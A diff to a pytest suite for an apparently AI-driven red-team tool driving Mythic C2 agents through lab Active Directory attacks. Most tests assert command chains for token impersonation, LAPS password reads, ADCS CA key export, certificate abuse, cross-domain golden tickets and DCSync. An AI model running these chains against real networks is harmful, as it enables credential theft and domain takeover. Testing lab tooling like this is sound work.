+    mt._fetch_credentials_cached = fake_fetch_credentials
+    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)
+
+    result = asyncio.run(mt._ensure_netonly_plaintext_credential("lab.local", "SageNetOnlyContext1!"))
+
+    assert result == {"id": 88, "status": "created"}
+    assert created == [{
+        "credential": "SageNetOnlyContext1!",
+        "account": "sage.netonly",
+        "realm": "lab.local",
+        "comment": "Sage sacrificial NetOnly context; not a valid account password",
+        "credential_type": "plaintext",
+    }]
+
+
+def test_execute_account_context_stops_after_make_token_rejects_hash(monkeypatch):
+    mt = _make_tools()
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(
+        0,
+        result=_apollo_make_token_schema() if command == "make_token" else [],
+    )
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 32,
+            "account": "alice",
+            "realm": "lab.local",
+            "type": "key",
+            "credential_text": "a" * 64,
+            "comment": "aes256",
+        }]
+
+    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
+        return {"status": "success", "id": 88}
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")
+    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)
+    ticket = base64.b64encode(b"A" * 80).decode()
+    outputs = iter([
+        "No tickets in current context.",
+        "Access is denied.",
+        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
+        "Credential material is not a plaintext password.",
+        "Credential material is not a plaintext password.",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7200):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "ensure-account-kerberos-context",
+                "domain": "lab.local",
+                "account": "alice",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+
+    assert result["ok"] is False
+    assert result["verdict"] == "failed"
+    assert "plaintext password" in result["reason"]
+    issued_commands = [call["command_name"] for call in calls["issued"]]
+    assert issued_commands[-1] == "make_token"
+    assert "ticket_store_add" not in issued_commands
+    make_token = calls["issued"][-1]
+    assert make_token["parameters"]["Credential"] == "@cred:88"
 
 
 def test_build_capability_commands_supports_managed_secret_read():
@@ -2944,8 +3549,8 @@ def test_deterministic_managed_secret_read_records_redacted_effect():
     }
     hop = mt._engagement_hops[-1]
     assert hop.technique == "capability:read-managed-local-admin-secret"
-    assert hop.evidence["mythic_task_id"] == 7101
-    assert hop.evidence["callback_id"] == 13
+    assert hop.evidence["mythic_task_id"] == "7101"
+    assert hop.evidence["callback_id"] == "13"
     assert "CorrectHorseBatteryStaple" not in json.dumps(hop.evidence)
 
 
@@ -3022,6 +3627,150 @@ def test_execute_capability_managed_secret_read_refreshes_stale_account_context(
     ]
     assert result["recorded_effects"] == ["managed-local-admin-secret:ws01@child.lab.local"]
     assert "CorrectHorseBatteryStaple" not in json.dumps(mt._engagement_hops[-1].evidence)
+
+
+def test_execute_capability_managed_secret_read_uses_matching_live_foothold_context():
+    mt = _make_tools()
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="13",
+            agent="apollo",
+            host="MEEREEN",
+            forest="essos.local",
+            identity="jorah.mormont",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-06-12T12:00:00Z",
+        ),
+    ]
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="meereen.essos.local")
+    calls = {"issue": 0}
+    output = "\n".join([
+        "distinguishedname=CN=BRAAVOS,DC=essos,DC=local",
+        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
+    ])
+
+    with _split_issue(output, calls, display_id=7200):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "read-managed-local-admin-secret",
+                "account": "jorah.mormont",
+                "account_domain": "essos.local",
+                "target_host": "braavos",
+                "target_domain": "essos.local",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+
+    assert result["ok"] is True, result
+    assert result["verdict"] == "achieved"
+    assert calls["issue"] == 1
+    assert [item["command"] for item in result["issued"]] == ["powerpick"]
+    assert result["recorded_effects"] == ["managed-local-admin-secret:braavos@essos.local"]
+
+
+def test_live_foothold_context_match_rejects_cross_domain_identity():
+    mt = _make_tools()
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="13",
+            agent="apollo",
+            host="MEEREEN",
+            forest="essos.local",
+            identity="NORTH\\jorah.mormont",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-06-12T12:00:00Z",
+        ),
+    ]
+
+    assert mt._callback_current_identity_matches_account_context(
+        "13",
+        "jorah.mormont",
+        "essos.local",
+    ) is False
+
+
+def test_execute_capability_managed_secret_read_reuses_runtime_proven_account_context(monkeypatch):
+    mt = _make_tools()
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    record_command_result = mt._record_deterministic_capability_command_result
+
+    def record_with_mythic_make_token_parameter_rewrite(command, parameters, callback_display_id, output, **kwargs):
+        if command != "make_token":
+            record_command_result(command, parameters, callback_display_id, output, **kwargs)
+
+    monkeypatch.setattr(
+        mt,
+        "_record_deterministic_capability_command_result",
+        record_with_mythic_make_token_parameter_rewrite,
+    )
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
+        0,
+        result="dc01.child.lab.local" if domain == "child.lab.local" else "dc01.lab.local",
+    )
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 32,
+            "account": "alice",
+            "realm": "lab.local",
+            "type": "key",
+            "credential_text": "a" * 64,
+            "comment": "aes256",
+        }]
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    ticket = base64.b64encode(b"A" * 80).decode()
+    calls = {"issue": 0}
+    outputs = iter([
+        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
+        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
+        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
+        "Successfully impersonated local\\user for local access and lab.local\\alice for remote access.",
+        "Added Ticket to Ticket Store",
+        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
+        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
+        "\n".join([
+        "distinguishedname=CN=WS01,DC=child,DC=lab,DC=local",
+        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
+        ]),
+    ])
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7200):
+        context_result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "ensure-account-kerberos-context",
+                "domain": "lab.local",
+                "account": "alice",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "read-managed-local-admin-secret",
+                "account": "alice",
+                "account_domain": "lab.local",
+                "target_host": "ws01",
+                "target_domain": "child.lab.local",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+
+    assert context_result["ok"] is True, context_result
+    assert result["ok"] is True, json.dumps(result, indent=2)
+    assert result["verdict"] == "achieved"
+    assert calls["issue"] == 8
+    assert [item["command"] for item in result["issued"]] == ["powerpick"]
+    assert result["recorded_effects"] == ["managed-local-admin-secret:ws01@child.lab.local"]
 
 
 def test_read_managed_secret_imports_plaintext_credential(monkeypatch):
@@ -3268,7 +4017,7 @@ def test_build_capability_commands_adcs_ca_export_uses_wmiexecute_after_remote_e
     }
 
 
-def test_build_capability_commands_adcs_ca_export_apollo_defaults_to_powerpick_orchestration(monkeypatch):
+def test_build_capability_commands_adcs_ca_export_apollo_defaults_to_token_backed_wmiexecute(monkeypatch):
     mt = _make_tools()
     mt._engagement_hops = [
         _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
@@ -3300,14 +4049,27 @@ def test_build_capability_commands_adcs_ca_export_apollo_defaults_to_powerpick_o
     )))
 
     assert plan["ok"] is True
-    assert [item["command"] for item in plan["commands"]] == ["powerpick"]
-    script = plan["commands"][0]["parameters"]
-    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in script
-    assert "Start-Sleep -Seconds 45" in script
-    assert "New-PSDrive -Name SAGECA" in script
-    assert "-Credential $cred" in script
+    assert [item["command"] for item in plan["commands"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    assert plan["commands"][0]["parameters"]["Credential"] == {
+        "account": "Administrator",
+        "credential": "CorrectHorseBatteryStaple!",
+        "realm": "ca01",
+        "type": "plaintext",
+    }
+    remote = plan["commands"][1]
+    assert remote["parameters"]["host"] == "ca01.lab.local"
+    assert "username" not in remote["parameters"]
+    assert "password" not in remote["parameters"]
+    assert "domain" not in remote["parameters"]
+    encoded = remote["parameters"]["command"].split("-EncodedCommand ", 1)[1]
+    script = base64.b64decode(encoded).decode("utf-16le")
+    assert "Invoke-WmiMethod" not in script
     assert "certutil.exe -f -p" in script
     assert "PFX_BASE64=" in script
+    assert plan["commands"][2]["parameters"] == {
+        "path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_13.txt",
+    }
+    assert plan["commands"][3]["operation"] == "local-admin-logon-session-revert"
 
 
 def test_build_capability_commands_adcs_ca_export_uses_merlin_profile_after_remote_exec(monkeypatch):
@@ -3349,7 +4111,7 @@ def test_build_capability_commands_adcs_ca_export_uses_merlin_profile_after_remo
     assert plan["commands"][1]["parameters"]["executable"] == "powershell.exe"
 
 
-def test_build_capability_commands_adcs_ca_export_apollo_preserves_explicit_wmiexecute(monkeypatch):
+def test_build_capability_commands_adcs_ca_export_apollo_explicit_wmiexecute_still_uses_token_context(monkeypatch):
     mt = _make_tools()
     mt._engagement_hops = [
         _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
@@ -3381,7 +4143,10 @@ def test_build_capability_commands_adcs_ca_export_apollo_preserves_explicit_wmie
     )))
 
     assert plan["ok"] is True
-    assert [item["command"] for item in plan["commands"]] == ["wmiexecute", "cat"]
+    assert [item["command"] for item in plan["commands"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    assert "username" not in plan["commands"][1]["parameters"]
+    assert "password" not in plan["commands"][1]["parameters"]
+    assert "domain" not in plan["commands"][1]["parameters"]
 
 
 def test_build_capability_commands_adcs_ca_export_sharpdpapi_uses_powerpick(monkeypatch):
@@ -3462,12 +4227,73 @@ def test_build_capability_commands_supports_local_admin_secret_use_from_credenti
     ]
     assert [command["command"] for command in plan["commands"]] == ["make_token", "ls"]
     assert plan["commands"][0]["parameters"]["credential"] == {
+        "id": "91",
         "account": "Administrator",
         "realm": "ws01",
         "credential": "CorrectHorseBatteryStaple!",
         "type": "plaintext",
     }
     assert plan["commands"][1]["parameters"] == {"path": r"\\ws01.child.lab.local\C$"}
+
+
+def test_execute_local_admin_secret_use_tasks_mythic_credential_reference(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop(
+            "managed-local-admin-secret:ws01@child.lab.local",
+            7200,
+            callback_id="13",
+            technique="capability:read-managed-local-admin-secret",
+        )
+    ]
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(
+        0,
+        result=_apollo_make_token_schema() if command == "make_token" else [],
+    )
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 91,
+            "account": "Administrator",
+            "realm": "ws01",
+            "type": "plaintext",
+            "credential_text": "CorrectHorseBatteryStaple!",
+            "comment": "managed local admin password for ws01",
+        }]
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    calls = {"issue": 0}
+    outputs = iter([
+        "Successfully impersonated ws01\\Administrator for remote access.",
+        "\n".join([
+            r" Volume in drive \\ws01.child.lab.local\C$ has no label.",
+            r" Directory of \\ws01.child.lab.local\C$",
+            "06/10/2026  12:00 PM    <DIR>          Windows",
+        ]),
+    ])
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7201):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "use-managed-local-admin-secret",
+                "target_host": "ws01",
+                "target_domain": "child.lab.local",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+
+    assert result["ok"] is True, json.dumps(result, indent=2)
+    assert result["verdict"] == "achieved"
+    assert calls["issued"][0]["command_name"] == "make_token"
+    assert calls["issued"][0]["parameters"]["Credential"] == "@cred:91"
+    assert calls["issued"][1]["command_name"] == "ls"
+    assert set(result["recorded_effects"]) == {
+        "local-admin:ws01@child.lab.local",
+        "admin:ws01",
+        "system-or-admin:ws01",
+    }
 
 
 def test_deterministic_local_admin_secret_use_records_admin_effects_without_secret():
@@ -3522,8 +4348,8 @@ def test_deterministic_local_admin_secret_use_records_admin_effects_without_secr
     assert "system-or-admin:ws01" in satisfied
     hop = mt._engagement_hops[-1]
     assert hop.technique == "capability:use-managed-local-admin-secret"
-    assert hop.evidence["mythic_task_id"] == 7201
-    assert hop.evidence["callback_id"] == 13
+    assert hop.evidence["mythic_task_id"] == "7201"
+    assert hop.evidence["callback_id"] == "13"
     assert "CorrectHorseBatteryStaple" not in json.dumps(hop.evidence)
 
 
@@ -3675,15 +4501,22 @@ def test_build_capability_commands_apollo_remote_exec_uses_local_admin_context(m
     )))
 
     assert plan["ok"] is True
-    assert [command["command"] for command in plan["commands"]] == ["wmiexecute", "cat"]
-    assert plan["commands"][0]["parameters"]["host"] == "ws01.child.lab.local"
-    assert plan["commands"][0]["parameters"]["domain"] == "ws01"
-    assert plan["commands"][0]["parameters"]["username"] == "Administrator"
-    assert plan["commands"][0]["parameters"]["password"] == "CorrectHorseBatteryStaple!"
-    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in plan["commands"][0]["parameters"]["command"]
-    assert plan["commands"][1]["parameters"] == {
+    assert [command["command"] for command in plan["commands"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    assert plan["commands"][0]["parameters"]["Credential"] == {
+        "account": "Administrator",
+        "credential": "CorrectHorseBatteryStaple!",
+        "realm": "ws01",
+        "type": "plaintext",
+    }
+    assert plan["commands"][1]["parameters"]["host"] == "ws01.child.lab.local"
+    assert "domain" not in plan["commands"][1]["parameters"]
+    assert "username" not in plan["commands"][1]["parameters"]
+    assert "password" not in plan["commands"][1]["parameters"]
+    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in plan["commands"][1]["parameters"]["command"]
+    assert plan["commands"][2]["parameters"] == {
         "path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt",
     }
+    assert plan["commands"][3]["operation"] == "local-admin-logon-session-revert"
 
 
 def test_deterministic_remote_execution_records_effect_without_secret():
@@ -3742,8 +4575,8 @@ def test_deterministic_remote_execution_records_effect_without_secret():
     assert "host-exec:ws01" in satisfied
     hop = mt._engagement_hops[-1]
     assert hop.technique == "capability:execute-as-local-admin"
-    assert hop.evidence["mythic_task_id"] == 7301
-    assert hop.evidence["callback_id"] == 13
+    assert hop.evidence["mythic_task_id"] == "7301"
+    assert hop.evidence["callback_id"] == "13"
     assert "CorrectHorseBatteryStaple" not in json.dumps(hop.evidence)
 
 
@@ -3850,6 +4683,7 @@ def test_execute_capability_apollo_remote_exec_records_local_admin_context_proof
     mt._engagement_hops = [
         _proof_hop("local-admin:ws01@child.lab.local", 7299, callback_id="13"),
     ]
+    mt._kerberos_logon_context_keys.add((13, "ws01", "administrator", True))
     mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
     mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
 
@@ -3867,12 +4701,13 @@ def test_execute_capability_apollo_remote_exec_records_local_admin_context_proof
     monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
     monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
     outputs = iter([
-        "Command executed successfully",
+        "Command spawned PID (1372) successfully",
         "\n".join([
             "SAGE_REMOTE_EXEC_PROOF_ws01_13",
             "ws01\\administrator",
             "WS01",
         ]),
+        "Reverted to original token",
     ])
     calls = {"issue": 0}
 
@@ -3889,14 +4724,70 @@ def test_execute_capability_apollo_remote_exec_records_local_admin_context_proof
 
     assert result["ok"] is True, result
     assert result["verdict"] == "achieved"
-    assert [item["command_name"] for item in calls["issued"]] == ["wmiexecute", "cat"]
+    assert [item["command_name"] for item in calls["issued"]] == ["wmiexecute", "cat", "rev2self"]
     assert calls["issued"][0]["parameters"]["host"] == "ws01.child.lab.local"
-    assert calls["issued"][0]["parameters"]["domain"] == "ws01"
-    assert calls["issued"][0]["parameters"]["username"] == "Administrator"
-    assert calls["issued"][0]["parameters"]["password"] == "CorrectHorseBatteryStaple!"
+    assert "domain" not in calls["issued"][0]["parameters"]
+    assert "username" not in calls["issued"][0]["parameters"]
+    assert "password" not in calls["issued"][0]["parameters"]
+    assert result["issued"][-1]["cleanup"] is True
     assert result["recorded_effects"] == [
         "host-exec:ws01",
         "remote-exec:ws01@child.lab.local",
+    ]
+
+
+def test_execute_capability_apollo_remote_exec_refreshes_replaced_local_admin_context(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop("local-admin:oak-ops01@oak.ridge.local", 7299, callback_id="13"),
+    ]
+    mt._kerberos_logon_context_keys.add((13, "pine-ops01", "administrator", True))
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+
+    async def fake_payload_type(callback_id):
+        return "apollo"
+
+    async def fake_select(target_host, target_domain, local_account):
+        return {
+            "id": 91,
+            "account": local_account,
+            "realm": target_host,
+            "credential": "CorrectHorseBatteryStaple!",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
+    outputs = iter([
+        "Successfully impersonated remote identity.",
+        "Command spawned PID (1372) successfully",
+        "\n".join([
+            "SAGE_REMOTE_EXEC_PROOF_oak_ops01_13",
+            "oak-ops01\\administrator",
+            "OAK-OPS01",
+        ]),
+        "Reverted to original token",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7304):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "execute-as-local-admin",
+                "target_host": "oak-ops01",
+                "target_domain": "oak.ridge.local",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+
+    assert result["ok"] is True, result
+    assert result["verdict"] == "achieved"
+    assert [item["command_name"] for item in calls["issued"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    assert calls["issued"][0]["parameters"]["Credential"]["realm"] == "oak-ops01"
+    assert result["recorded_effects"] == [
+        "host-exec:oak-ops01",
+        "remote-exec:oak-ops01@oak.ridge.local",
     ]
 
 
@@ -3926,11 +4817,12 @@ def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypat
         "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
         "CA_HOST=CA01\\r\\n"
         "CA_EXPORT_STATUS=OK\\r\\n"
-        "CA_SUBJECT=CN=LAB-CA\\r\\n"
-        "CA_ISSUER=CN=LAB-CA\\r\\n"
-        "CA_THUMBPRINT=ABCDEF1234\\r\\n"
-        "CA_PFX_PATH=C:\\\\Windows\\\\Temp\\\\sage_ca_export_ca01_13.pfx\\r\\n"
-        f"PFX_SHA256={pfx_sha256}\\r\\n"
+            "CA_SUBJECT=CN=LAB-CA\\r\\n"
+            "CA_ISSUER=CN=LAB-CA\\r\\n"
+            "CA_THUMBPRINT=ABCDEF1234\\r\\n"
+            "CA_PFX_PATH=C:\\\\Windows\\\\Temp\\\\sage_ca_export_ca01_13.pfx\\r\\n"
+            "PFX_ARTIFACT_ID=artifact-ca-7401\\r\\n"
+            f"PFX_SHA256={pfx_sha256}\\r\\n"
         f"PFX_BASE64={pfx}\\r\\n'\n\n"
         "[SAGE OPSEC] footprint total=3"
     )
@@ -3963,6 +4855,120 @@ def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypat
     assert Path(hop.evidence["pfx_artifact_path"]).is_file()
     assert hop.evidence["probe"]["pfx_artifact_sha256"] == pfx_sha256
     assert '"pfx_base64":' not in json.dumps(hop.evidence).casefold()
+
+
+def test_execute_capability_apollo_adcs_ca_export_uses_token_backed_wmiexecute_readback(monkeypatch, tmp_path):
+    mt = _make_tools()
+    monkeypatch.setenv("SAGE_ENGAGEMENT_STATE_DIR", str(tmp_path))
+    mt._engagement_hops = [
+        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
+        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
+    ]
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+
+    async def fake_payload_type(callback_id):
+        return "apollo"
+
+    async def fake_select(target_host, target_domain, local_account):
+        return {
+            "id": 91,
+            "account": local_account,
+            "realm": target_host,
+            "credential": "CorrectHorseBatteryStaple!",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
+    pfx_blob = b"0" + b"A" * 512
+    pfx = base64.b64encode(pfx_blob).decode("ascii")
+    pfx_sha256 = hashlib.sha256(pfx_blob).hexdigest()
+    adcs_output = (
+        "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
+        "CA_HOST=CA01\\r\\n"
+        "CA_EXPORT_STATUS=OK\\r\\n"
+        "CA_SUBJECT=CN=LAB-CA\\r\\n"
+        "CA_ISSUER=CN=LAB-CA\\r\\n"
+        "CA_THUMBPRINT=ABCDEF1234\\r\\n"
+        "CA_PFX_PATH=C:\\\\Windows\\\\Temp\\\\sage_ca_export_ca01_13.pfx\\r\\n"
+        f"PFX_SHA256={pfx_sha256}\\r\\n"
+        f"PFX_BASE64={pfx}\\r\\n'\n\n"
+        "[SAGE OPSEC] footprint total=3"
+    )
+    outputs = iter([
+        "Successfully impersonated ca01\\Administrator",
+        "Command spawned PID (1372) successfully",
+        adcs_output,
+        "Reverted identity to original token",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7402):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "adcs-ca-private-key-export",
+                "target_host": "ca01",
+                "target_domain": "lab.local",
+                "callback_id": "13",
+            },
+            {"timeout": 5},
+        )))
+
+    assert result["ok"] is True, result
+    assert result["verdict"] == "achieved"
+    assert [item["command_name"] for item in calls["issued"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    assert calls["issued"][1]["parameters"]["host"] == "ca01.lab.local"
+    assert "username" not in calls["issued"][1]["parameters"]
+    assert "password" not in calls["issued"][1]["parameters"]
+    assert "domain" not in calls["issued"][1]["parameters"]
+    assert result["issued"][-1]["cleanup"] is True
+    assert result["recorded_effects"] == [
+        "adcs-ca-private-key:ca01@lab.local",
+        "adcs-ca:ca01@lab.local",
+    ]
+
+
+def test_execute_capability_adcs_esc_enroll_records_certificate_effect():
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop("adcs-ca-key-export-blocked:ca01@lab.local", 7401, callback_id="13"),
+    ]
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    pfx = base64.b64encode(b"0" + b"B" * 512).decode("ascii")
+    output = "\n".join([
+        "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_13",
+        "CERT_ENROLL_STATUS=OK",
+        "CERT_ENROLL_TEMPLATE=VulnerableUser",
+        r"CERT_ENROLL_CA=ca01.lab.local\LAB-CA",
+        r"CERT_PFX_PATH=C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
+        f"PFX_BASE64={pfx}",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(output, calls, display_id=7402):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "adcs-esc-certificate-enroll",
+                "domain": "lab.local",
+                "account": "administrator",
+                "ca_host": "ca01",
+                "callback_id": "13",
+            },
+            {
+                "ca_name": r"ca01.lab.local\LAB-CA",
+                "template": "VulnerableUser",
+                "timeout": 5,
+            },
+        )))
+
+    assert result["ok"] is True, result
+    assert result["verdict"] == "achieved"
+    assert calls["issue"] == 1
+    assert result["recorded_effects"] == [
+        "adcs-enrolled-certificate:administrator@lab.local",
+    ]
+    assert result["issued"][0]["verify_verdict"] == "achieved"
 
 
 def test_execute_capability_adcs_ca_export_returns_key_not_exportable_blocker(monkeypatch):
@@ -4176,7 +5182,7 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
 
     assert plan["ok"] is True
     # Cross-domain (child->parent) forge: import the forged child TGT into the current session and ask Windows
-    # to acquire the parent LDAP ticket before the parent DCSync proof.
+    # to acquire the parent CIFS ticket before proving current-callback access.
     assert [item["command"] for item in plan["commands"]] == [
         "shell",
         "shell",
@@ -4185,7 +5191,7 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
         "ticket_cache_add",
         "ticket_cache_list",
         "shell",
-        "dcsync",
+        "shell",
     ]
     assert plan["commands"][0]["produces"] == ["kerberos_context_inventory"]
     assert plan["commands"][0]["parameters"] == "klist"
@@ -4201,7 +5207,7 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     assert command["produces"] == ["kerberos_ticket_base64"]
     assert "asktgs" not in json.dumps(plan["commands"])
     assert plan["commands"][3]["parameters"] == {"all": True, "serviceName": "", "luid": ""}
-    # Import the child TGT into the current Kerberos context before asking the OS for the parent LDAP ticket.
+    # Import the child TGT into the current Kerberos context before asking the OS for the parent CIFS ticket.
     assert plan["commands"][4]["command"] == "ticket_cache_add"
     assert plan["commands"][4]["deferred"] is True
     assert "kerberos_ticket_base64" in plan["commands"][4]["consumes"]
@@ -4210,14 +5216,11 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     assert plan["commands"][5]["command"] == "ticket_cache_list"
     assert plan["commands"][5]["parameters"] == {"luid": "", "getSystemTickets": False}
     assert plan["commands"][6]["command"] == "shell"
-    assert plan["commands"][6]["parameters"] == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
-    # Parent-DCSync proof: replicate the parent krbtgt from the parent DC (user qualified at issue time).
-    dcsync = plan["commands"][7]
-    assert dcsync["command"] == "dcsync"
-    assert dcsync["parameters"]["domain"] == "sevenkingdoms.local"
-    assert dcsync["parameters"]["user"] == "SEVENKINGDOMS\\krbtgt"
-    assert dcsync["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"
-    assert plan["execution_plan"]["steps"][-1]["operation"] == "drsuapi-dcsync"
+    assert plan["commands"][6]["parameters"] == "klist.exe get cifs/kingslanding.sevenkingdoms.local"
+    proof = plan["commands"][7]
+    assert proof["command"] == "shell"
+    assert proof["parameters"] == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
+    assert plan["execution_plan"]["steps"][-1]["operation"] == "kerberos-context-service-proof"
     assert plan["action"]["effects"] == ["da:sevenkingdoms.local"]
 
 
@@ -4321,7 +5324,7 @@ def test_build_capability_commands_can_opt_into_explicit_asktgs_fallback():
         "execute_assembly",
     ]
     assert "/service:krbtgt/root.local" in plan["commands"][3]["parameters"]["assembly_arguments"]
-    assert "/service:ldap/dc01.root.local" in plan["commands"][4]["parameters"]["assembly_arguments"]
+    assert "/service:cifs/dc01.root.local" in plan["commands"][4]["parameters"]["assembly_arguments"]
 
 
 def test_build_capability_commands_resolves_source_and_parent_domain_sids():
@@ -4365,8 +5368,8 @@ def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     assert "/sids:S-1-5-21-444-555-666-519" in rendered
     assert plan["execution_plan"]["steps"][2]["parameters"]["extra_sids"] == ["S-1-5-21-444-555-666-519"]
     assert "service" not in plan["execution_plan"]["steps"][1]["parameters"]
-    # Cross-domain proof is a parent-krbtgt DCSync from the parent DC, not a CIFS service-access probe.
-    # The default path imports the child TGT and asks Windows for the parent LDAP ticket before DCSync.
+    # Cross-domain proof is current-callback parent CIFS service access. The default path imports the child TGT
+    # and asks Windows for the parent CIFS ticket before the proof.
     import_step = plan["execution_plan"]["steps"][4]
     assert import_step["operation"] == "kerberos-ticket-import"
     assert import_step["parameters"]["domain"] == "north.sevenkingdoms.local"
@@ -4375,12 +5378,11 @@ def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     }
     acquire_step = plan["execution_plan"]["steps"][-2]
     assert acquire_step["operation"] == "kerberos-service-ticket-acquire"
-    assert acquire_step["parameters"]["service"] == "ldap/kingslanding.sevenkingdoms.local"
-    dcsync_step = plan["execution_plan"]["steps"][-1]
-    assert dcsync_step["operation"] == "drsuapi-dcsync"
-    assert dcsync_step["parameters"]["domain"] == "sevenkingdoms.local"
-    assert dcsync_step["parameters"]["account"] == "krbtgt"
-    assert dcsync_step["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"
